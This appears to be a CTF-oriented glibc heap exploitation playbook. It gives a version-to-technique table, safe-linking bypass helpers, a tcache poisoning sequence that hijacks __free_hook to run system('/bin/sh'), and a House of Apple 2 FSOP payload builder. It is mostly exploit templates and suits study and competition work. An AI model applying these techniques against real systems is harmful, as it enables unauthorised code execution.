# Heap Exploitation Playbook (skills/pwn/heap-pwn.md)

## 1. Glibc Heap Architecture & Triage Matrix

| Glibc Version | Key Protections | Primary Exploitation Techniques | Target Hooks / Structures |
| :--- | :--- | :--- | :--- |
| **2.23 - 2.26** | Basic sanity checks | Fastbin Dup, Unsorted Bin Attack, House of Orange | `__malloc_hook`, `__free_hook`, `_IO_FILE` vtable |
| **2.27 - 2.31** | Tcache introduced, Double free check (2.29+) | Tcache Poisoning, Tcache Stashing Unlink, House of Botcake | `__free_hook`, `system("/bin/sh")` |
| **2.32 - 2.33** | Safe-Linking (Pointer Mangling: `P ^ (L >> 12)`) | Safe-Linking bypass + Tcache Poisoning | `__free_hook` |
| **2.34 - 2.39+** | Hooks removed (`__free_hook = NULL`) | FSOP, House of Apple 2, House of Cat, House of Emma | `_IO_2_1_stdout_`, `_IO_wfile_overflow`, `_IO_cookie_jumps` |

---

## 2. Safe-Linking Pointer Mangling Bypass (Glibc >= 2.32)

In Glibc >= 2.32, single-linked lists (tcache and fastbins) protect their `next` pointer using:
$$\text{mangled\_ptr} = (\text{chunk\_addr} \gg 12) \oplus \text{target\_ptr}$$

### Helper Functions:
```python
def protect(pos, target):
    """Mangles target address for Glibc 2.32+ tcache/fastbin."""
    return (pos >> 12) ^ target

def reveal(mangled):
    """Demangles a leaked pointer from memory."""
    mask = 0xfff << 36
    while mask:
        mangled ^= (mangled & mask) >> 12
        mask >>= 12
    return mangled
```

---

## 3. Tcache Poisoning (Glibc 2.27 - 2.31)
```python
# 1. Allocate two chunks of same size
add(0, 0x60)
add(1, 0x60)

# 2. Free both into tcache
free(0)
free(1)

# 3. UAF / Overwrite tcache next pointer to __free_hook
edit(1, p64(libc.sym['__free_hook']))

# 4. Allocate twice to get chunk at __free_hook
add(2, 0x60) # Gets original chunk 1
add(3, 0x60) # Returns pointer to __free_hook!

# 5. Overwrite __free_hook with system() and free chunk containing "/bin/sh"
edit(3, p64(libc.sym['system']))
add(4, 0x60, b"/bin/sh\x00")
free(4) # Triggers system("/bin/sh")
```

---

## 4. Modern FSOP & House of Apple 2 (Glibc >= 2.34)

When hooks are removed, hijack `_IO_FILE` wide-data virtual tables (`_IO_wfile_jumps` $\rightarrow$ `_IO_wfile_overflow`):

```python
def house_of_apple_2(fake_file_addr, target_fn, target_arg):
    """
    Constructs a House of Apple 2 fake _IO_FILE structure targeting _IO_wfile_overflow.
    """
    fake_file = bytearray(0xe0)
    # _flags = "  sh"
    fake_file[0:8] = b"  sh\x00\x00\x00\x00"
    
    # _IO_wide_data pointer inside fake_file
    fake_wide_data = fake_file_addr + 0xe0
    fake_file[0xa0:0xa8] = p64(fake_wide_data)
    
    # vtable pointer -> _IO_wfile_jumps
    fake_file[0xd8:0xe0] = p64(libc.sym['_IO_wfile_jumps'])
    
    # Build fake _IO_wide_data
    wide_data = bytearray(0x100)
    # wide_data->_wide_vtable pointer
    wide_vtable = fake_wide_data + 0xe0
    wide_data[0xe0:0xe8] = p64(wide_vtable)
    
    # fake _wide_vtable with target function in doallocate or sync
    vtable_payload = bytearray(0x100)
    # offset for _IO_wfile_overflow -> calls doallocate at offset 0x68
    vtable_payload[0x68:0x70] = p64(target_fn)
    
    return bytes(fake_file) + bytes(wide_data) + bytes(vtable_payload)
```
